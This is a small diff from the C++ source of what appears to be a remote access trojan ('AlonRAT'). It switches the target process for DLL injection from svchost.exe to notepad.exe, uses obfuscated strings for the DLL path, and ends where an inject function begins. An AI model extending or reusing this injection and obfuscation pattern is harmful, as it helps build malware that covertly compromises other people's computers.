@@ -5,7 +5,7 @@
 #include <iostream>
 
 #define DLL_PATH OBFUSCATE("C:\\Users\\alonp\\source\\repos\\AlonRAT\\x64\\Release\\AlonRAT.dll")
-#define PROCESS_NAME OBFUSCATE("svchost.exe")
+#define PROCESS_NAME OBFUSCATE("notepad.exe")
 
 bool inject(DWORD pid, const char* dll_store_path)
 {
